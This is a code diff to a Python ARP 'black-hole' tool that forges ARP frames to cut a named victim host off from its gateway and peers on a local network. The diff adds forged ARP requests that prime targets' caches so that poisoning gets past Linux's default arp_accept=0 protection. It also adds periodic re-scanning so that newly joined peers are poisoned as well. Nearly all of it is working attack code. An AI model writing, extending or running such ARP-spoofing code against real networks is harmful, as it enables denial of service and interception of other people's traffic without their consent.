@@ -24,6 +24,7 @@ log = logging.getLogger("cutoff.arpguard")
 
 ETH_P_ARP = 0x0806
 BROADCAST = b"\xff" * 6
+MAX_PEERS = 64
 
 
 def _mac_bytes(mac: str) -> bytes:
@@ -36,6 +37,25 @@ def arp_reply(dst_mac: str, src_mac: str, sender_ip: str, sender_mac: str,
     arp = struct.pack(
         "!HHBBH6s4s6s4s",
         1, 0x0800, 6, 4, 2,
+        _mac_bytes(sender_mac), socket.inet_aton(sender_ip),
+        _mac_bytes(target_mac), socket.inet_aton(target_ip),
+    )
+    return eth + arp
+
+
+def arp_request(dst_mac: str, src_mac: str, sender_ip: str, sender_mac: str,
+                target_ip: str, target_mac: str) -> bytes:
+    """ARP request used as a cache primer.
+
+    A forged *reply* only updates an entry the target already has (Linux keeps
+    ``arp_accept=0`` by default). Sending a request for the target's own
+    address makes it create an entry for the spoofed sender before the first
+    poison, which is what a peer that appeared after the block needs.
+    """
+    eth = struct.pack("!6s6sH", _mac_bytes(dst_mac), _mac_bytes(src_mac), ETH_P_ARP)
+    arp = struct.pack(
+        "!HHBBH6s4s6s4s",
+        1, 0x0800, 6, 4, 1,
         _mac_bytes(sender_mac), socket.inet_aton(sender_ip),
         _mac_bytes(target_mac), socket.inet_aton(target_ip),
     )
@@ -69,7 +89,8 @@ class ArpBlackhole:
                  peers: list[tuple[str, str]] | None = None,
                  total: bool = False,
                  refresh: float = 2.0, max_minutes: int = 120,
-                 forward_blocked: bool = False):
+                 forward_blocked: bool = False,
+                 peer_provider=None, peer_refresh: float = 10.0):
         self.iface = iface
         self.our_ip = our_ip
         self.our_mac = our_mac
@@ -77,11 +98,16 @@ class ArpBlackhole:
         self.gateway_mac = gateway_mac
         self.victim_ip = victim_ip
         self.victim_mac = victim_mac
-        self.peers = [(ip, mac) for ip, mac in (peers or []) if ip and mac]
+        self.peers = self._clean_peers(peers or [])
         self.total = total
         self.refresh = max(0.5, refresh)
         self.max_seconds = max(1, max_minutes) * 60
         self.forward_blocked = forward_blocked
+        self.peer_provider = peer_provider
+        self.peer_refresh = max(1.0, peer_refresh)
+        self._peer_lock = threading.RLock()
+        self._primed: set[tuple[str, str]] = set()
+        self.primed = 0
         self.pairs = self._build_pairs()
         self.started_at = 0.0
         self.sent = 0
@@ -89,6 +115,15 @@ class ArpBlackhole:
         self._sock: socket.socket | None = None
         self._thread: threading.Thread | None = None
         self.error = ""
+
+    @staticmethod
+    def _clean_peers(peers) -> list[tuple[str, str]]:
+        clean: list[tuple[str, str]] = []
+        for ip, mac in peers:
+            if not ip or not mac:
+                continue
+            clean.append((ip, mac))
+        return clean[:MAX_PEERS]
 
     def _build_pairs(self) -> list[dict]:
         pairs = [
@@ -142,6 +177,30 @@ class ArpBlackhole:
         return True, (f"black-holing {self.victim_ip} "
                       f"({len(self.pairs)} ARP pairs, total={self.total})")
 
+    def _prime(self, pair: dict) -> None:
+        """Make the destination create a cache entry for the spoofed sender.
+
+        Reply-only poisoning silently no-ops on a host that has no entry for
+        the claimed address yet (Linux ``arp_accept=0``), which is exactly the
+        case for a peer that joined after the block started.
+        """
+        if not self._sock:
+            return
+        key = (pair["dst_mac"], pair["spoof_ip"])
+        if key in self._primed:
+            return
+        frame = arp_request(
+            dst_mac=pair["dst_mac"], src_mac=self.our_mac,
+            sender_ip=pair["spoof_ip"], sender_mac=self.our_mac,
+            target_ip=pair["dst_ip"], target_mac=pair["dst_mac"],
+        )
+        try:
+            self._sock.send(frame)
+            self.primed += 1
+            self._primed.add(key)
+        except OSError as exc:
+            self.error = str(exc)
+
     def _send_pair(self, pair: dict, poison: bool) -> None:
         if not self._sock:
             return
@@ -161,8 +220,41 @@ class ArpBlackhole:
             self.error = str(exc)
 
     def _send_all(self, poison: bool = True) -> None:
-        for pair in self.pairs:
+        with self._peer_lock:
+            pairs = list(self.pairs)
+        for pair in pairs:
+            if poison:
+                self._prime(pair)
             self._send_pair(pair, poison)
+
+    def set_peers(self, peers: list[tuple[str, str]]) -> list[dict]:
+        """Replace the peer set and return the pairs that are new.
+
+        Called from the refresh loop, so it must be safe while the sender
+        thread iterates ``self.pairs``.
+        """
+        cleaned = self._clean_peers(peers)
+        with self._peer_lock:
+            if cleaned == self.peers:
+                return []
+            self.peers = cleaned
+            self.pairs = self._build_pairs()
+            fresh = [p for p in self.pairs
+                     if (p["dst_mac"], p["spoof_ip"]) not in self._primed]
+        return fresh
+
+    def _refresh_peers(self) -> None:
+        if not self.peer_provider:
+            return
+        try:
+            peers = self.peer_provider()
+        except Exception:  # noqa: BLE001 - a bad probe must not kill the block
+            log.exception("ARP peer provider failed")
+            return
+        fresh = self.set_peers(list(peers or []))
+        if fresh:
+            log.info("ARP peer list refreshed: %d peer(s), %d new pair(s)",
+                     len(self.peers), len(fresh))
 
     def _restore(self) -> None:
         for _ in range(3):
@@ -170,12 +262,16 @@ class ArpBlackhole:
             time.sleep(0.15)
 
     def _loop(self) -> None:
+        last_peer = time.time()
         while not self._stop.wait(self.refresh):
             if time.time() - self.started_at > self.max_seconds:
                 log.warning("black-hole TTL expired for %s", self.victim_ip)
                 self._restore()
                 self._stop.set()
                 break
+            if time.time() - last_peer >= self.peer_refresh:
+                last_peer = time.time()
+                self._refresh_peers()
             self._send_all(poison=True)
 
     def stop(self) -> None:
@@ -199,6 +295,7 @@ class ArpBlackhole:
             "peers": len(self.peers) if self.total else 0,
             "active": bool(self._thread and self._thread.is_alive()),
             "sent": self.sent,
+            "primed": self.primed,
             "age_s": int(time.time() - self.started_at) if self.started_at else 0,
             "ttl_s": self.max_seconds,
             "error": self.error,
